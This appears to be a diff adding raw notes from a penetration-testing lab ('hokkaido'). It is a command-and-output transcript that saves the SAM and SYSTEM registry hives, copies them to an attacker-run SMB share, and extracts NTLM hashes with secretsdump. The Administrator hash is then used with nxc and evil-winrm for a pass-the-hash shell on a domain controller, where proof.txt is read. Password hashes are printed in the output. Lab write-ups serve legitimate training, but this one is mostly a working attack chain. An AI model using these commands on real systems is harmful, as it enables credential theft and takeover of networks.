+    + CategoryInfo          : PermissionDenied: (C:\users\administrator:String) [Get-ChildItem], UnauthorizedAccessExc
+   eption
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+
+PS C:\users\administrator> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                         State
+============================= =================================== ========
+SeMachineAccountPrivilege     Add workstations to domain          Disabled
+SeSystemtimePrivilege         Change the system time              Disabled
+SeBackupPrivilege             Back up files and directories       Disabled
+SeRestorePrivilege            Restore files and directories       Disabled
+SeShutdownPrivilege           Shut down the system                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeRemoteShutdownPrivilege     Force shutdown from a remote system Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
+SeTimeZonePrivilege           Change the time zone                Disabled
+
+
+#I created a directory temp
+
+PS C:\> cd temp
+PS C:\temp> reg save hklm\sam c:\temp\sam
+The operation completed successfully.
+PS C:\temp> reg save hklm\system c:\temp\system
+The operation completed successfully.
+PS C:\temp> ls
+
+
+    Directory: C:\temp
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          7/3/2025   3:22 AM          49152 sam
+-a----          7/3/2025   3:22 AM       17981440 system
+
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ sudo smbserver.py -username root -password root -smb2support share .
+[sudo] password for kali: 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (192.168.154.40,50137)
+[*] AUTHENTICATE_MESSAGE (\root,DC)
+[*] User DC\root authenticated successfully
+[*] root:::aaaaaaaaaaaaaaaa:c735dda0e7c20f77a737654b4931065c:01010000000000000011a1fc04ecdb01c37ddb39be3d83d100000000010010007600560078006f006500620044004b00030010007600560078006f006500620044004b00020010006a006a0050006d005900580065004f00040010006a006a0050006d005900580065004f00070008000011a1fc04ecdb0106000400020000000800300030000000000000000000000000300000e6097e5635334855b151f6a3e605142baf66d25b26adc55836ad409884eb925e0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200300032000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:share)
+
+PS C:\temp> net use Z: \\192.168.45.202\share /user:root root
+The command completed successfully.
+
+PS C:\temp> cd \\192.168.45.202\share
+PS Microsoft.PowerShell.Core\FileSystem::\\192.168.45.202\share> cp C:\temp\sam .
+PS Microsoft.PowerShell.Core\FileSystem::\\192.168.45.202\share> cp C:\temp\system .
+PS Microsoft.PowerShell.Core\FileSystem::\\192.168.45.202\share>
+
+
+──(kali㉿kali)-[~/hokkaido]
+└─$ sudo impacket-secretsdump -sam sam -system system LOCAL 
+[sudo] password for kali: 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x2fcb0ca02fb5133abd227a05724cd961
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Cleaning up... 
+                                                                                                                                                                                                                       
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ nxc winrm 192.168.182.21 -u administrator -H d752482897d54e239376fddb2a2109e4                          
+                                                                                                                                                                                                                       
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ nxc winrm 192.168.154.40 -u administrator -H d752482897d54e239376fddb2a2109e4
+WINRM       192.168.154.40  5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:hokkaido-aerospace.com)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       192.168.154.40  5985   DC               [+] hokkaido-aerospace.com\administrator:d752482897d54e239376fddb2a2109e4 (Pwn3d!)
+WINRM       192.168.154.40  5985   DC               [-] hokkaido-aerospace.com\administrator:d752482897d54e239376fddb2a2109e4 zip() argument 2 is longer than argument 1
+                                                                                                                                                                                                                       
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ evil-winrm -i 192.168.154.40 -u administrator -H d752482897d54e239376fddb2a2109e4
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+haero\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
+dc
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cat Desktop\proof.txt
+90a289b00b0a527c77aad04daf87fecd
+*Evil-WinRM* PS C:\Users\Administrator> 
+
+
+
+
+
+
+
+
+ 
+
+
